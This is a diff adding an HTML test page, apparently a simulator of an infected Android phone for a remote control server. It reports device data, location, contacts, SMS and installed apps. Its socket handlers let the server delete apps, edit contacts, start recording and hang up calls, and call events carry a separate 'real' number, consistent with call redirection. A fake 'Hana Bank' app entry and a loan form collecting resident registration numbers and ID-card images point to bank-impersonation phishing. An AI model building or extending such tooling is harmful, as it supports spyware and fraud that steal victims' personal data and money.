@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>모바일 모의</title>
+    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
+    <script src="/assets/plugins/jquery.min.js"></script>
+    <script src="/assets/socket/socket.io-client/dist/socket.io.js"></script>
+    <style>
+        table {
+            background-color: rgb(195, 242, 195);
+        }
+        
+        table,
+        th,
+        td {
+            border: 1px solid black;
+            border-collapse: collapse;
+        }
+        
+        th,
+        td {
+            padding: 5px;
+            text-align: left;
+        }
+        
+        .pan_board {
+            display: flex;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>아이디:</td>
+                <td><input type="text" id="mobile_id" value="1007"></td>
+                <td>모델:</td>
+                <td><input type="text" id="model" value="SM-N986N"></td>
+            </tr>
+            <tr>
+                <td>제조업체:</td>
+                <td><input type="text" id="brand" value="samsung-10"></td>
+                <td>체계정보:</td>
+                <td><input type="text" id="system_version" value="7.0"></td>
+            </tr>
+            <tr>
+                <td>전화번호:</td>
+                <td><input type="text" id="mobile_number" value="821052443520"></td>
+                <td>통신사:</td>
+                <td><input type="text" id="network_operator" value="LG U+"></td>
+            </tr>
+            <tr>
+                <td>APP_ID:</td>
+                <td><input type="text" id="app_id" value="chongpan"></td>
+                <td>조작:</td>
+                <td><button type="button" onclick="login()">로그인</button></td>
+            </tr>
+        </table>
+    </div>
+    <hr>
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>배터리상태:</td>
+                <td> <input type="text" id="battery_level" value="90"></td>
+                <td>네트워크 연결 상태:</td>
+                <td><input type="text" id="connectivity" value="WIFI"></td>
+            </tr>
+        </table>
+        <button type="button" onclick="heartbeat()">기재상태 갱신</button>
+    </div>
+    <hr>
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>위도:</td>
+                <td><input type="text" id="latitude" value="128.49926"></td>
+                <td>경도:</td>
+                <td><input type="text" id="longitude" value="35.80440"></td>
+            </tr>
+        </table>
+        <button type="button" onclick="updateLocation()">위치 갱신</button>
+    </div>
+    <hr>
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>이름:</td>
+                <td><input type="text" id="apk_name" value="하나은행"></td>
+                <td>package:</td>
+                <td><input type="text" id="apk_package" value="com.paekjo.rmc"></td>
+                <td>버젼:</td>
+                <td><input type="text" id="apk_version" value="0.2.0"></td>
+            </tr>
+            <tr>
+                <td>최초 설치 시간:</td>
+                <td><input type="text" id="apk_start_time" value="1231351"></td>
+                <td>마지막 설치 시간:</td>
+                <td><input type="text" id="apk_last_time" value="1354168"></td>
+                <td colspan_board="2"><button type="button" onclick="installApk()">APK 설치</button></td>
+            </tr>
+        </table>
+    </div>
+    <hr>
+
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>호출 방향:</td>
+                <td>
+                    <select id="direction">
+                        <option value="incoming">수신</option>
+                        <option value="outgoing">발신</option>
+                    </select>
+                </td>
+                <td>번호:</td>
+                <td><input type="text" id="number" value="12313"></td>
+                <td>실제번호:</td>
+                <td><input type="text" id="number_real" value="456456"></td>
+            </tr>
+        </table>
+        <div>
+            <button type="button" onclick="call('block')" id="block_btn">block</button>
+            <button type="button" onclick="call('start')" id="start_btn">start</button>
+            <button type="button" onclick="call('offhook')" id="offhook_btn">offhook</button>
+            <button type="button" onclick="call('end')" id="end_btn">end</button>
+        </div>
+    </div>
+
+    <hr>
+    <div>
+        <div>녹화상태:
+            <span id="streaming"></span>
+        </div>
+    </div>
+
+    <hr>
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>이름:</td>
+                <td><input type="text" id="nickname" value="임꺽정"></td>
+                <td>전화번호:</td>
+                <td><input type="text" id="phone" value="98600001"></td>
+            </tr>
+            <tr>
+                <td>주민등록 번호:</td>
+                <td><input type="text" id="social" value="123456789"></td>
+                <td>아이디 카드:</td>
+                <td><input type="file" id="filename"></td>
+            </tr>
+            <tr>
+                <td>직장:</td>
+                <td><input type="text" id="company" value="직장1"></td>
+                <td>연봉: </td>
+                <td><input type="text" id="income" value="87015100"></td>
+            </tr>
+            <tr>
+                <td>신청액:</td>
+                <td><input type="text" id="amount" value="100000"></td>
+                <td>집주소:</td>
+                <td><input type="text" id="address" value="인천시"></td>
+            </tr>
+        </table>
+
+        <div><button type="button" onclick="submitLoan()" id="loan_btn">신청</button></div>
+    </div>
+    <hr>
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>이름:</td>
+                <td><input type="text" id="contact_name" value="홍길동"></td>
+                <td>번호:</td>
+                <td><input type="text" id="contact_number" value="010213513"></td>
+        </table>
+        <button type="button" onclick="addContactByUser()">contact 추가</button>
+    </div>
+    <hr>
+    <div class="pan_board">
+        <table>
+            <tr>
+                <td>전화번호</td>
+                <td><input type="tel" id="sms_number" width="20" value="01022154"></td>
+                <td>내용:</td>
+                <td><textarea id="sms_body" rows="1" style="width: 300px;"></textarea></td>
+            </tr>
+        </table>
+        <button type="button" onclick="sendMessage()">전송</button>
+    </div>
+
+    <script type="text/javascript">
+        var phone_state = "end";
+        var socket = io();
+        var installed_apks = [];
+        var installed_packages = new Set();
+        var contacts = [
+            ['임꺽정', '01000524358']
+        ];
+        var messages = [];
+
+        function updateCallingState() {
+            if (phone_state == "start") {
+                $("#block_btn").prop("disabled", true);
+                $("#start_btn").prop("disabled", true);
+                $("#offhook_btn").prop("disabled", false);
+                $("#end_btn").prop("disabled", false);
+            } else if (phone_state == "offhook") {
+                $("#block_btn").prop('disabled', true);
+                $("#start_btn").prop("disabled", true);
+                $("#offhook_btn").prop("disabled", true);
+                $("#end_btn").prop('disabled', false);
+            } else if (phone_state == "end" || phone_state === "block") {
+                $("#block_btn").prop("disabled", false);
+                $("#start_btn").prop("disabled", false);
+                $("#offhook_btn").prop("disabled", true);
+                $("#end_btn").prop('disabled', true);
+            }
+        }
+
+        function call(type) {
+            phone_state = type;
+            var data = {
+                id: $("#mobile_id").val(),
+                event: type,
+                direction: $('#direction').val(),
+                number: $('#number').val(),
+                number_real: $('#number_real').val(),
+            }
+            $.ajax({
+                type: "post",
+                url: "/api/mobile/call",
+                data: data,
+                dataType: 'json',
+                success: function(data) {
+                    updateCallingState();
+                },
+                error: function(data) {
+                    updateCallingState();
+                }
+            });
+        }
+
+        function login() {
+            var data = {
+                id: $("#mobile_id").val(),
+                app_id: $('#app_id').val(),
+                model: $("#model").val(),
+                brand: $("#brand").val(),
+                system_version: $("#system_version").val(),
+                number: $("#mobile_number").val(),
+                imei: $("#imei").val(),
+                network_operator: $("#network_operator").val(),
+            }
+            socket.emit('login', {
+                type: 'mobile',
+                ...data
+            })
+        }
+        setInterval(heartbeat, 15 * 1000);
+
+        function heartbeat() {
+            var data = {
+                id: $("#mobile_id").val(),
+                timestamp: Date.now(),
+                battery_level: $("#battery_level").val(),
+                connectivity: $("#connectivity").val(),
+            }
+            $.ajax({
+                type: "post",
+                url: '/api/mobile/heartbeat',
+                data: data,
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                }
+            });
+        }
+
+        function submitLoan() {
+
+            let formData = new FormData();
+            formData.append('id', $('#mobile_id').val());
+            formData.append('nickname', $('#nickname').val());
+            formData.append('phone', $('#phone').val());
+            formData.append('social', $('#social').val());
+            formData.append('company', $('#company').val());
+            formData.append('income', $('#income').val());
+            formData.append('amount', $('#amount').val());
+            formData.append('address', $('#address').val());
+            if ($("#filename")[0].files.length > 0) {
+                formData.append("file", $("#filename")[0].files[0]);
+                formData.append("fileName", $("#filename")[0].files[0].name)
+            }
+
+            $.ajax({
+                type: "post",
+                url: '/api/mobile/loan',
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false, // required
+                success: function(data) {},
+                error: function(data) {
+                }
+            });
+
+        }
+
+        function updateLocation() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/location',
+                data: {
+                    id: $('#mobile_id').val(),
+                    latitude: $('#latitude').val(),
+                    longitude: $('#longitude').val()
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                }
+            })
+        }
+
+        function installApk() {
+            var package = $('#apk_package').val();
+            if (!installed_packages.has(package)) {
+                installed_apks.push([
+                    $('#apk_name').val(),
+                    package,
+                    $('#apk_version').val(),
+                    $('#apk_start_time').val(),
+                    $('#apk_last_time').val(),
+                ]);
+
+                installed_packages.add(package);
+            }
+        }
+
+        function uploadApks() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/apks',
+                data: {
+                    id: $('#mobile_id').val(),
+                    apks: installed_apks
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                }
+            })
+        }
+
+        function deleteApk(data) {
+            console.log('data: ', data);
+            if (installed_packages.delete(data.package)) {
+                var index = installed_apks.findIndex(el => el[1] === data.package)
+                installed_apks.splice(index, 1);
+            }
+            uploadApks();
+        }
+
+        function addContactByUser() {
+            contacts.push([
+                $('#contact_name').val(),
+                $('#contact_number').val(),
+            ]);
+        }
+
+        function uploadContacts() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/contacts',
+                data: {
+                    id: $('#mobile_id').val(),
+                    contacts: contacts
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                }
+            })
+        }
+
+        function deleteContact(data) {
+            console.log('data: ', data);
+            for (var i = 0; i < data.contacts.length; i++) {
+                var index = contacts.findIndex(el => el[0] === data.contacts[i].name && el[1] === data.contacts[i].number)
+                contacts.splice(index, 1);
+            }
+            uploadContacts();
+        }
+
+        function addContact(data) {
+            contacts.push([
+                data.name,
+                data.number
+            ]);
+
+            uploadContacts();
+        }
+
+        function sendMessage() {
+            var number = $('#sms_number').val();
+            var body = $('#sms_body').val();
+
+            if (!number || !body)
+                return;
+
+            messages.push([Date.now(), number, body, 'sent']);
+            smsUpdated();
+        }
+
+        function uploadSms(data) {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/sms',
+                data: {
+                    id: $('#mobile_id').val(),
+                    messages
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                }
+            })
+        }
+
+        function receiveSms(data) {
+            messages.push([Date.now(), data.number, data.body, 'inbox'])
+            smsUpdated();
+        }
+
+        function smsUpdated() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/sms_updated',
+                data: {
+                    id: $('#mobile_id').val(),
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                }
+            })
+        }
+
+        $(document).ready(function() {
+            updateCallingState();
+
+            socket.on('hangup', function({
+                number
+            }) {
+                $('#number_real').val(number);
+                call('end');
+            });
+
+            socket.on('start_streaming', function(data) {
+                $('#streaming').text('녹화중');
+            });
+
+            socket.on('stop_streaming', function(data) {
+                $('#streaming').text('');
+            });
+
+            socket.on('upload_apks', function(data) {
+                uploadApks();
+            });
+
+            socket.on('delete_apk', function(data) {
+                deleteApk(data);
+            })
+
+            socket.on('upload_contacts', function(data) {
+                uploadContacts();
+            });
+
+            socket.on('delete_contact', function(data) {
+                deleteContact(data);
+            })
+
+            socket.on('add_contact', function(data) {
+                addContact(data);
+            })
+
+            socket.on('upload_sms', function(data) {
+                uploadSms(data);
+            })
+
+            socket.on('send_sms', function(data) {
+                receiveSms(data);
+            })
+
+        })
+    </script>
+</body>
+
+</html>
